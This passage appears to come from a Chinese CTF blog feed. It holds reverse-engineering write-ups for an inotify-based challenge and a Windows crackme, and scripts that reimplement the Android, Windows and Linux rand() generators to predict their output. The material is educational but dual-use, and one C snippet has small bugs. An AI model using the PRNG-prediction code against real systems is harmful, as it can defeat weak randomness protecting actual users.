class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>my first real world</title>
      <link href="/2021/08/31/my-first-real-world/"/>
      <url>/2021/08/31/my-first-real-world/</url>
      
        <content type="html"><![CDATA[<p>见飞书</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>inctf-noodes</title>
      <link href="/2021/08/16/inctf-noodes/"/>
      <url>/2021/08/16/inctf-noodes/</url>
      
        <content type="html"><![CDATA[<h2 id="inctf-noodes"><a href="#inctf-noodes" class="headerlink" title="inctf-noodes"></a>inctf-noodes</h2><p>这个题算是诈胡出来的</p><span id="more"></span><p>参考链接:</p><p><a href="https://linux.die.net/man/7/inotify">https://linux.die.net/man/7/inotify</a></p><p><a href="https://zh.wikipedia.org/wiki/Inotify">https://zh.wikipedia.org/wiki/Inotify</a></p><h3 id="比较的地方"><a href="#比较的地方" class="headerlink" title="比较的地方"></a>比较的地方</h3><pre class="line-numbers language-none"><code class="language-none">if ( !strcmp(          s1,          "dfxXdf5FcwL\\adsUddPedd}UdflZafn~af9TmflZcwlZafilddKYafM^dfxRmfENcwENddXmdf\\Raff\\df{xddL[adeiadJkdfW5cwiTdd7"          "Ydf^zadkKcw:jadeudfU=dfj~dd[}dfM9cwp7dfhnmfTjcwTjddyQdfftdd5UdfIxddGydfgnddjYdfqZcwqPcwfpdflLddUoaf~vddWqafZJd"          "f=Tcw{Zmf|Fcw|FddnkadUgdfj\\dfr^dd]SdfGJcwwJdfFtcwzFcwXVcwE|cwkPddWMdd]iadu:cwFRad\\IafXrafNxmfElcwElafJvafx9d"          "f4|dd8mmfH~cwH~mfT~cwT~afkFafvpdfj5dd}SafVRmfFpmfP|mfThmfNLmf5ZcwFpcwP|cw\\xcw=7cwyncwG|cwThcwNLcw\\pcwI^cw5ZcwOT") )<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="s1的生成"><a href="#s1的生成" class="headerlink" title="s1的生成"></a>s1的生成</h3><pre class="line-numbers language-none"><code class="language-none">v45 = __readfsqword(0x28u);  index = 0;  s_index = 0;  sub_55D31246E16A();  sub_55D31246E1FA();  fd = inotify_init();   //初始化一个 inotify 实例  if ( fd &lt; 0 )    perror("inotify_init");  sub_55D31246E4B7("/tmp/chall/"); //初始化文件  wd = inotify_add_watch(fd, "/tmp/chall/", 0x33Fu); // 将监视添加到初始化的 inotify 实例  pid = fork(); //新建进程  if ( !pid )    sub_55D31246E668("/tmp/chall/");   //用户输入处理,文件变动  if ( waitpid(pid, &amp;stat_loc, 0) == -1 )  {    perror("waitpid failed\n");    goto LABEL_35;  }  v40 = BYTE1(stat_loc);  printf("%d", BYTE1(stat_loc));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">size = read(fd, buf, 0x8000uLL);  if ( size &lt; 0 )    perror("read");  while ( index &lt; size )  {    byte = &amp;buf[index];    if ( !*((_DWORD *)byte + 3) )      goto LABEL_30;    if ( (*((_DWORD *)byte + 1) &amp; 0x100) != 0 ) // IN_CREATE     {      v3 = s_index;      if ( (*((_DWORD *)byte + 1) &amp; 0x40000000) != 0 )// IN_ISDIR      {        ++s_index;        s1[v3] = 'c';        v4 = s_index++;        s1[v4] = 'd';      }      else      {        ++s_index;        s1[v3] = 'c';        v5 = s_index++;        s1[v5] = 'f';      }LABEL_26:      v23 = byte[16] + 4;      v24 = s_index++;      s1[v24] = v23;      v25 = byte[17] + 4;      v26 = s_index++;      s1[v26] = v25;      goto LABEL_30;    }    if ( (*((_DWORD *)byte + 1) &amp; 0x200) != 0 ) // IN_DELETE       {      v6 = s_index;      if ( (*((_DWORD *)byte + 1) &amp; 0x40000000) != 0 )      {        ++s_index;        s1[v6] = 'd';        v7 = s_index++;        s1[v7] = 'd';      }      else      {        ++s_index;        s1[v6] = 'd';        v8 = s_index++;        s1[v8] = 'f';      }      goto LABEL_26;    }    if ( (*((_DWORD *)byte + 1) &amp; 8) != 0 )     // IN_CLOSE_WRITE    {      v9 = s_index++;      s1[v9] = 'c';      v10 = s_index++;      s1[v10] = 'w';      v11 = byte[16] + 4;      v12 = s_index++;      s1[v12] = v11;      v13 = byte[17] + 4;      v14 = s_index++;      s1[v14] = v13;      goto LABEL_30;    }    if ( (*((_DWORD *)byte + 1) &amp; 1) != 0 )     // IN_ACCESS    {      v15 = s_index++;      s1[v15] = 'a';      v16 = s_index++;      s1[v16] = 'c';      v17 = byte[16] + 4;      v18 = s_index++;      s1[v18] = v17;      v19 = byte[17] + 4;      v20 = s_index++;      s1[v20] = v19;      goto LABEL_30;    }    if ( (*((_DWORD *)byte + 1) &amp; 4) != 0 )     // IN_ATTRIB     {      v21 = s_index;      if ( (*((_DWORD *)byte + 1) &amp; 0x40000000) != 0 )      {        ++s_index;        s1[v21] = 'a';        v22 = s_index++;        s1[v22] = 'd';      }      else      {        ++s_index;        s1[v21] = 'a';        v27 = s_index++;        s1[v27] = 'f';      }      goto LABEL_26;    }    if ( (*((_DWORD *)byte + 1) &amp; 2) != 0 )     // IN_MODIFY    {      v28 = s_index++;      s1[v28] = 'm';      v29 = s_index++;      s1[v29] = 'f';      v30 = byte[16] + 4;      v31 = s_index++;      s1[v31] = v30;      v32 = byte[17] + 4;      v33 = s_index++;      s1[v33] = v32;    }LABEL_30:    index += *((_DWORD *)byte + 3) + 16;  }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="inotify"><a href="#inotify" class="headerlink" title="inotify"></a>inotify</h3><p>这个感觉和git有点点像, 监控文件的变动, 变动会生成事件</p><pre class="line-numbers language-none"><code class="language-none">struct inotify_event {    int      wd;       /* Watch descriptor */    uint32_t mask;     /* Mask of events */    uint32_t cookie;   /* Unique cookie associating related                          events (for rename(2)) */    uint32_t len;      /* Size of name field */    char     name[];   /* Optional null-terminated name */};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里涉及的事件</p><pre class="line-numbers language-none"><code class="language-none">IN_ACCESS   0x00000001  文件被访问（读取）（*）。IN_CLOSE_WRITE   0x00000008为写入而打开的文件已关闭 (*)。IN_ATTRIB         0x00000004  权限修改IN_ISDIR         0x40000000事件的目标是文件夹IN_CREATE         0x00000100  有新文件产生(可能是目录)IN_DELETE         0x00000200有文件被删除(可能是目录)IN_MODIFY         0x00000002修改文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里4字节长度刚好对应index += *((_DWORD *)byte + 3) + 16;的加16</p><h3 id="处理输入"><a href="#处理输入" class="headerlink" title="处理输入"></a>处理输入</h3><pre class="line-numbers language-none"><code class="language-none">1: stream[v3] = fopen(dest, "a+");<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">2: fclose(stream[--v9]);//生成cw<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">3: fwrite("Wrong", 1uLL, 5uLL, stream[v9 - 1]);//生成mf <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">4: unlink(dest);//生成df<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">5: chmod(dest, 0x164u);//生成af<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">6: rmdir(dest);//生成dd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">7: mkdir(dest, 0x1C0u);//生成cd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">8:exit(0)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>除了2,3不能有名称之外都有2字节的名称</p><h3 id="分析比较字符串"><a href="#分析比较字符串" class="headerlink" title="分析比较字符串"></a>分析比较字符串</h3><p>这里的字符串没有新建操作, 前面的文件初始化已经完成了(监控开启之前)</p><p>注意:df之后不能再打开文件, 否则会出现新建操作,(这里有一处就是这样df之后才mf的, 这里应该再df之前就打开, 我把这个操作放在了最前面, mf之前和cw之前一定要打开文件指针, 打开操作只需要一次, (mf, cw相同的文件只打开一次, 每次mf都会有cw收尾), exit会关闭所有的文件指针(这里也会被记录, 后打开的先关闭)</p><p>生成输入脚本: (因为mf操作不多, 我就直接手动删除多余的新建操作, 最后再加个8)</p><pre class="line-numbers language-none"><code class="language-none">#include&lt;iostream&gt;using namespace std;int main(){    char a[437] = {    0x64, 0x66, 0x78, 0x58, 0x64, 0x66, 0x35, 0x46, 0x63, 0x77, 0x4C, 0x5C, 0x61, 0x64, 0x73, 0x55,     0x64, 0x64, 0x50, 0x65, 0x64, 0x64, 0x7D, 0x55, 0x64, 0x66, 0x6C, 0x5A, 0x61, 0x66, 0x6E, 0x7E,     0x61, 0x66, 0x39, 0x54, 0x6D, 0x66, 0x6C, 0x5A, 0x63, 0x77, 0x6C, 0x5A, 0x61, 0x66, 0x69, 0x6C,     0x64, 0x64, 0x4B, 0x59, 0x61, 0x66, 0x4D, 0x5E, 0x64, 0x66, 0x78, 0x52, 0x6D, 0x66, 0x45, 0x4E,     0x63, 0x77, 0x45, 0x4E, 0x64, 0x64, 0x58, 0x6D, 0x64, 0x66, 0x5C, 0x52, 0x61, 0x66, 0x66, 0x5C,     0x64, 0x66, 0x7B, 0x78, 0x64, 0x64, 0x4C, 0x5B, 0x61, 0x64, 0x65, 0x69, 0x61, 0x64, 0x4A, 0x6B,     0x64, 0x66, 0x57, 0x35, 0x63, 0x77, 0x69, 0x54, 0x64, 0x64, 0x37, 0x59, 0x64, 0x66, 0x5E, 0x7A,     0x61, 0x64, 0x6B, 0x4B, 0x63, 0x77, 0x3A, 0x6A, 0x61, 0x64, 0x65, 0x75, 0x64, 0x66, 0x55, 0x3D,     0x64, 0x66, 0x6A, 0x7E, 0x64, 0x64, 0x5B, 0x7D, 0x64, 0x66, 0x4D, 0x39, 0x63, 0x77, 0x70, 0x37,     0x64, 0x66, 0x68, 0x6E, 0x6D, 0x66, 0x54, 0x6A, 0x63, 0x77, 0x54, 0x6A, 0x64, 0x64, 0x79, 0x51,     0x64, 0x66, 0x66, 0x74, 0x64, 0x64, 0x35, 0x55, 0x64, 0x66, 0x49, 0x78, 0x64, 0x64, 0x47, 0x79,     0x64, 0x66, 0x67, 0x6E, 0x64, 0x64, 0x6A, 0x59, 0x64, 0x66, 0x71, 0x5A, 0x63, 0x77, 0x71, 0x50,     0x63, 0x77, 0x66, 0x70, 0x64, 0x66, 0x6C, 0x4C, 0x64, 0x64, 0x55, 0x6F, 0x61, 0x66, 0x7E, 0x76,     0x64, 0x64, 0x57, 0x71, 0x61, 0x66, 0x5A, 0x4A, 0x64, 0x66, 0x3D, 0x54, 0x63, 0x77, 0x7B, 0x5A,     0x6D, 0x66, 0x7C, 0x46, 0x63, 0x77, 0x7C, 0x46, 0x64, 0x64, 0x6E, 0x6B, 0x61, 0x64, 0x55, 0x67,     0x64, 0x66, 0x6A, 0x5C, 0x64, 0x66, 0x72, 0x5E, 0x64, 0x64, 0x5D, 0x53, 0x64, 0x66, 0x47, 0x4A,     0x63, 0x77, 0x77, 0x4A, 0x64, 0x66, 0x46, 0x74, 0x63, 0x77, 0x7A, 0x46, 0x63, 0x77, 0x58, 0x56,     0x63, 0x77, 0x45, 0x7C, 0x63, 0x77, 0x6B, 0x50, 0x64, 0x64, 0x57, 0x4D, 0x64, 0x64, 0x5D, 0x69,     0x61, 0x64, 0x75, 0x3A, 0x63, 0x77, 0x46, 0x52, 0x61, 0x64, 0x5C, 0x49, 0x61, 0x66, 0x58, 0x72,     0x61, 0x66, 0x4E, 0x78, 0x6D, 0x66, 0x45, 0x6C, 0x63, 0x77, 0x45, 0x6C, 0x61, 0x66, 0x4A, 0x76,     0x61, 0x66, 0x78, 0x39, 0x64, 0x66, 0x34, 0x7C, 0x64, 0x64, 0x38, 0x6D, 0x6D, 0x66, 0x48, 0x7E,     0x63, 0x77, 0x48, 0x7E, 0x6D, 0x66, 0x54, 0x7E, 0x63, 0x77, 0x54, 0x7E, 0x61, 0x66, 0x6B, 0x46,     0x61, 0x66, 0x76, 0x70, 0x64, 0x66, 0x6A, 0x35, 0x64, 0x64, 0x7D, 0x53, 0x61, 0x66, 0x56, 0x52,     0x6D, 0x66, 0x46, 0x70, 0x6D, 0x66, 0x50, 0x7C, 0x6D, 0x66, 0x54, 0x68, 0x6D, 0x66, 0x4E, 0x4C,     0x6D, 0x66, 0x35, 0x5A, 0x63, 0x77, 0x46, 0x70, 0x63, 0x77, 0x50, 0x7C, 0x63, 0x77, 0x5C, 0x78,     0x63, 0x77, 0x3D, 0x37, 0x63, 0x77, 0x79, 0x6E, 0x63, 0x77, 0x47, 0x7C, 0x63, 0x77, 0x54, 0x68,     0x63, 0x77, 0x4E, 0x4C, 0x63, 0x77, 0x5C, 0x70, 0x63, 0x77, 0x49, 0x5E, 0x63, 0x77, 0x35, 0x5A,     0x63, 0x77, 0x4F, 0x54, 0x00    };    for (int i = 0; i &lt; 437; i += 4)    {        if (a[i] == 'c' &amp;&amp; a[i + 1] == 'f')            cout &lt;&lt; "1" &lt;&lt; char((a[i + 2] - 4)) &lt;&lt; char((a[i + 3] - 4));        else if (a[i] == 'c' &amp;&amp; a[i + 1] == 'w')            cout &lt;&lt; "1" &lt;&lt; char((a[i + 2] - 4)) &lt;&lt; char((a[i + 3] - 4)) &lt;&lt; "2";        else if (a[i] == 'm' &amp;&amp; a[i + 1] == 'f')            cout &lt;&lt; "1" &lt;&lt; char((a[i + 2] - 4)) &lt;&lt; char((a[i + 3] - 4)) &lt;&lt; "3";        else if (a[i] == 'd' &amp;&amp; a[i + 1] == 'f')            cout &lt;&lt; "4" &lt;&lt; char((a[i + 2] - 4)) &lt;&lt; char((a[i + 3] - 4));        else if (a[i] == 'a' &amp;&amp; a[i + 1] == 'f')            cout &lt;&lt; "5" &lt;&lt; char((a[i + 2] - 4)) &lt;&lt; char((a[i + 3] - 4));        else if (a[i] == 'a' &amp;&amp; a[i + 1] == 'd')            cout &lt;&lt; "5" &lt;&lt; char((a[i + 2] - 4)) &lt;&lt; char((a[i + 3] - 4));        else if (a[i] == 'd' &amp;&amp; a[i + 1] == 'd')            cout &lt;&lt; "6" &lt;&lt; char((a[i + 2] - 4)) &lt;&lt; char((a[i + 3] - 4));        else if (a[i] == 'c' &amp;&amp; a[i + 1] == 'd')            cout &lt;&lt; "7" &lt;&lt; char((a[i + 2] - 4)) &lt;&lt; char((a[i + 3] - 4));    }    system("pause");}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到1hV4tT41B1HX25oQ6La6yQ4hV5jz55P325eh6GU5IZ4tN1AJ326Ti4XN5bX4wt6HW5ae5Fg4S11eP263U4Zv5gG16f25aq4Q94fz6Wy4I51l324dj1Pf326uM4bp61Q4Et6Cu4cj6fU4mV1mL21bl24hH6Qk5zr6Sm5VF49P1wV21xB326jg5Qc4fX4nZ6YO4CF1sF24Bp1vB21TR21Ax21gL26SI6Ye5q61BN25XE5Tn5Jt1Ah325Fr5t540x64i1Dz321Pz325gB5rl4f16yO5RN1Bl31Lx31Pd31JH311V3221Xt219321uj21Cx2221Xl21EZ221KP28</p><p>最后输入发现有错误, 调试之后发现, 从SafVR之后开始, 这里完全倒了过来,</p><p>要求的s1:mfFpmfP|mfThmfNLmf5ZcwFpcwP|cw\xcw=7cwyncwG|cwThcwNLcw\pcwI^cw5ZcwOT</p><p>生成的s1:mf5Zcw5ZmfNLcwNLcw\xcw=7cwyncwG|mfThcwThmfP|cwP|cw\pcwI^mfFpcwFpcwOT</p><p>具体调试了函数之后(前面有一个闹钟记得patch掉), 这里mf之后并没有把字符串写入, 是在fclose文件指针之后把文件修改, 那到底怎么连续修改之后再关闭文件指针呢, 这里我试了一下exit来关闭文件指针,把输入后面改成:</p><p>1hV4tT41B1HX25oQ6La6yQ4hV5jz55P325eh6GU5IZ4tN1AJ326Ti4XN5bX4wt6HW5ae5Fg4S11eP263U4Zv5gG16f25aq4Q94fz6Wy4I51l324dj1Pf326uM4bp61Q4Et6Cu4cj6fU4mV1mL21bl24hH6Qk5zr6Sm5VF49P1wV21xB326jg5Qc4fX4nZ6YO4CF1sF24Bp1vB21TR21Ax21gL26SI6Ye5q61BN25XE5Tn5Jt1Ah325Fr5t540x64i1Dz321Pz325gB5rl4f16yO5RN(这里开始修改)</p><p>1KP11V31EZ1Xl1JH31Pd31Cx1uj1931Xt1Lx31Bl38, 成功得到flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>myrandom</title>
      <link href="/2021/08/09/myrandom/"/>
      <url>/2021/08/09/myrandom/</url>
      
        <content type="html"><![CDATA[<p>一个随机数脚本, android 是java的 </p><span id="more"></span><p>在网上翻翻找找总结了一下</p><h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><pre class="line-numbers language-none"><code class="language-none">"""from ctfbox.crypto import cryptocrypto.android_random(2) #seed must be setcrypto.windows_srand(2) #seed must be setcrypto.linux_srand(2) #seed must be setfor i in range(50):    print(crypto.android_nextInt()) #random number    print(crypto.android_nextInt_bound(10)) #random numbers between[0,10)    print(crypto.windows_rand()) #random number    print(crypto.linux_rand()) #random number"""from ctypes import c_intwindows_status = 1def windows_srand(seed):    """    Args:        seed(int): Random number seed    Returns: void    Example:        windows_srand(1)    """    global windows_status    windows_status = seeddef windows_rand():    """    Returns:        int: Random numbers    Example:        #seed must be set        windows_rand()    """    global windows_status    windows_status = (214013*windows_status+2531011) &amp; 0xffffffff    return windows_status &gt;&gt; 16 &amp; ((1 &lt;&lt; 15)-1)android_seed = 0android_multiplier = 0x5DEECE66Dandroid_addend = 0xBandroid_mask = (1 &lt;&lt; 48) - 1android_seedUniquifier = 8682522807148012def android_srand(seed):    """    Args:        seed(int): Random numbers seed    Returns: void    Example:        android_srand(1)    """    global android_seed    android_seed = _initialScramble(seed)def _initialScramble(seed):    return (seed ^ android_multiplier) &amp; android_maskdef _next(bits):    global android_seed    oldseed = 0    nextseed = 0    seed = android_seed    oldseed = seed    nextseed = (oldseed * android_multiplier + android_addend) &amp; android_mask    android_seed = nextseed    return c_int(((nextseed &gt;&gt; (48 - bits)))).valuedef android_nextInt():    """    Returns:        int: Random numbers    Example:        #seed must be set        android_nextInt()    """    return _next(32)def android_nextInt_bound(bound):    """    Args:        bound(int): Random numbers upper limit    Returns:        int: Random numbers between[0, bound)    Example:        #seed must be set        android_nextInt_bound(10)    """    global android_seed    r = _next(31)    m = bound - 1    if bound &amp; m == 0:        r = (((bound * (r &amp; 0xffffffffffffffff)) &gt;&gt; 31) &amp; 0xffffffff)    else:        u = r        r = u % bound        while u - r + m &lt; 0:            r = u % bound            u = _next(31)    return rlinux_status = 0linux_r = []def linux_srand(seed):    """    Args:         seed(int): Random numbers seed        Returns: void    Example:        linux_srand(1)            """    if seed == 0:        seed = 1    word = seed    seed = seed &amp; 0xffffffff    global linux_status    global linux_r    linux_status = 0    linux_r = [0] * (344 + linux_status)    linux_r[0] = seed    for i in range(1, 31):        if (word &lt; 0):            hi = (-word) // 127773            hi = -hi            lo = (-word) % 127773            lo = -lo        else:            hi = word // 127773            lo = word % 127773        word = ((16807 * lo)) - ((2836 * hi))        if word &lt; 0:            word = (2147483647 + word) &amp; 0xffffffff        linux_r[i] = word    for i in range(31, 34):        linux_r[i] = linux_r[i - 31]    for i in range(34, 344):        linux_r[i] = (((linux_r[i - 31] + linux_r[i - 3]) &amp; 0xffffffff) % (1 &lt;&lt; 32)) &amp; 0xffffffffdef linux_rand():    """    Returns:         int: Random numbers    Example:        #seed must be set        linux_rand()    """    global linux_status    global linux_r    linux_r.append(0)    linux_r[344 + linux_status] = (((linux_r[344 + linux_status - 31] + linux_r[344 + linux_status - 3]) &amp; 0xffffffff) % (1 &lt;&lt; 32)) &amp; 0xffffffff    linux_status += 1    return linux_r[344 + linux_status - 1] &gt;&gt; 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="C语言"><a href="#C语言" class="headerlink" title="C语言"></a>C语言</h3><h4 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h4><pre class="line-numbers language-none"><code class="language-none">include&lt;iostream&gt;using namespace std;int main(){    const int SEED = 1;     const unsigned int MOD = 0x7ffffffff;     const long long MOD_MAX = (1LL &lt;&lt; 32);    unsigned int r[700];    r[0] = 2; //种子    int32_t word;    word = seed;    for (int i = 1; i &lt; 31; i++)    {        long int hi = word / 127773;        long int lo = word % 127773;        word = 16807 * lo - 2836 * hi;        if (word &lt; 0)            word += 2147483647;        r[i] = word;    }     for(int i = 31; i &lt; 34; i++)         r[i] = r[i - 31];     for(int i = 34; i &lt; 700; i++) {         r[i] = (r[i - 3] + r[i - 31]) % MOD_MAX;     }    for (int i = 344; i &lt; 644; i++) //r[344]为第一个随机数,之后为随机数列,要得到更多的随机数,加长数组长度和循环次数就行        cout &lt;&lt; (r[i] &gt;&gt; 1) &lt;&lt; endl;    system("pause");}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><pre class="line-numbers language-none"><code class="language-none">#include&lt;iostream&gt;#include&lt;cstdlib&gt;# using namespace std;# unsigned int status=1;# int seed = 1;# int my_srand(unsigned int seed){#     status=seed;# }# int my_rand(){#     status=214013*status+2531011;#     return status&gt;&gt;16&amp;((1&lt;&lt;15)-1);# }# int main()# {#     int n = 1000;#     srand(1);#     while (n--)#     {#         cout &lt;&lt; rand() &lt;&lt; " "  &lt;&lt; my_rand() &lt;&lt; endl;#     }#     system("pause");# }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>cybricsctf-paired</title>
      <link href="/2021/07/25/cybricsctf-paired/"/>
      <url>/2021/07/25/cybricsctf-paired/</url>
      
        <content type="html"><![CDATA[<h2 id="paired"><a href="#paired" class="headerlink" title="paired"></a>paired</h2><p>解包,先得到4个文件,运行app1.exe</p><span id="more"></span><h3 id="app1"><a href="#app1" class="headerlink" title="app1"></a>app1</h3><p><img src="/2021/07/25/cybricsctf-paired/image-20210725145959566.png" alt="image-20210725145959566"></p><p>这几个函数不用再logic.dll里面分析,动调就可以知道是设置一个有id的储存</p><h4 id="WinMain"><a href="#WinMain" class="headerlink" title="WinMain"></a>WinMain</h4><pre class="line-numbers language-none"><code class="language-none">wndclass.lpfnWndProc = (WNDPROC)WndProc;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>根据窗口类lpfnWndProc的成员根据这里找到窗口过程</p><h4 id="STAGE-1"><a href="#STAGE-1" class="headerlink" title="STAGE 1"></a>STAGE 1</h4><pre class="line-numbers language-none"><code class="language-none">GetWindowTextA(edit_hWnd, String, 128);    v15 = (unsigned __int8 *)&amp;v19;    do    {      v16 = v15[String - (CHAR *)&amp;v19];      v17 = *v15 - v16;      if ( v17 )        break;      ++v15;    }    while ( v16 );    if ( !v17 )    {      SetWindowTextW(hWnd[0], L"STAGE 2");      pass_to_stage2 = 1;    }    return 0i64;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里获取edit控件字符串并检测,进入第二关</p><h4 id="STAGE-2"><a href="#STAGE-2" class="headerlink" title="STAGE 2"></a>STAGE 2</h4><p>case WM_KEYDOWN(0x100):</p><pre class="line-numbers language-none"><code class="language-none">else if ( pass_to_stage2 == 1 )     {       j = i;       if ( wParam != aEnable[i] )       {         i = 0;         return 0i64;       }       ++i;       if ( !aEnable[j + 1] )       {         pass_to_stage3 = 1;         SetWindowTextW(_hwnd, L"STAGE 3...");         add_to_storage(1i64, hWnd);         return 0i64;       }     }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>按键要等于’ENABLE’</p><p>进入第三关</p><h4 id="STAGE-3"><a href="#STAGE-3" class="headerlink" title="STAGE 3"></a>STAGE 3</h4><pre class="line-numbers language-none"><code class="language-none">case 0x400u:                                // WM_USER      if ( !get_flag )      {        GetWindowTextA(edit_hWnd, String, 128);        add_to_storage(2i64, String);        get_flag = 1;      }      v7 = VirtualAlloc(0i64, 0x200ui64, 0x1000u, 0x40u);      get_data_from_storage((unsigned int)(_wParam + 32), v7, 128i64);      v19 = 0i64;      v20 = 0i64;      v21 = 0i64;      v22 = 0i64;      v23 = 0i64;      v24 = 0i64;      v25 = 0i64;      v26 = 0i64;      get_data_from_storage(2i64, &amp;v19, 128i64);      success += ((__int64 (__fastcall *)(_QWORD, __int128 *))v7)((unsigned int)_wParam, &amp;v19);      if ( success == 32 )      {        MessageBoxA(0i64, "Well done!", "WINNER!", 0);        return 0i64;      }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>需要把消息WM_USER放入队列</p><pre class="line-numbers language-none"><code class="language-none">if ( pass_to_stage3 )      {        if ( wParam == 'F' )                    // fake        {          v11 = 0i64;          v12 = 32i64;          while ( 1 )          {            PostMessageA(_hwnd, 0x400u, v11++, 0i64);            if ( !--v12 )              break;            _hwnd = hWnd[0];          }        }      }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里可以加入WM_USER消息,动调查看v7函数之后,得到输入为this_is_just_some_random_string!,是fake flag,很明显不可能只分析一个文件</p><h3 